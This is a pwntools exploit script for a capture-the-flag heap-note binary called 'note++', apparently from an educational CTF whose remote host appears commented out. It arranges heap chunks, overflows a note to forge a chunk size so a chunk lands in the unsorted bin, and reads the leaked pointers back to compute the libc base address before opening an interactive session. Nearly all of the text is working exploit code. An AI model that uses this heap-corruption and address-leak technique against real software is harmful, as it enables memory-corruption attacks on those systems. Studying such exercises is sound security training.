import binascii
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc-2.23.so')

# FIXME: how to have this libc debug info???

# p = remote('edu-ctf.csie.org', 10181)
p = process('./note++', env={"LD_PRELOAD": os.path.join(os.getcwd(), './libc-2.23.so')})
gdb.attach(p, 'add-symbol-file mockup.o 0\n')
# b menu\n
# p = gdb.debug('./note++', 'b main\n')

# compile mockup.c to get a mocked symbol file

def add(size, body, desc):
    if not body or not desc:
        log.warn('Add note (sz=%d) of empty body or desc!', size)
        return
    p.sendlineafter('>', '1')
    p.sendlineafter('Size:', str(size))
    p.sendafter('Note:', body)
    # desc uses scanf, should end line explicitly; no space in string
    p.sendlineafter('Description of this note:', desc)

def list_all():
    p.sendlineafter('>', '2')

def delete(idx):
    print('Del: %d' % idx)
    p.sendlineafter('>', '3')
    p.sendlineafter('Index', str(idx))

# arrange the heap:
#                         0  1  2     3  4     5  6
for idx, sz in enumerate([0, 0, 0, 0x68, 0, 0x68, 0]):
    print('Add: %d' % idx)
    add(sz, 'AAAA', 'note-#%d' % idx)

list_all()

delete(1)
# fake the next block (idx=2)'s size so it ends up
# at unsorted bin, with fd/bk set
add(0, b'A' * 0x18 + p64(0x91), ':)))')
delete(2)

# leaking libc
delete(1)
add(0, b'A' * 0x20, ':)))')

list_all()
p.recvuntil('Data: ' + 'A' * 0x20)
libc_base = u64(p.recv(6) + b'\0\0') - 0x3c4b78
log.success('libc base: %s', hex(libc_base))

# p (struct Note[10])notes

p.interactive()
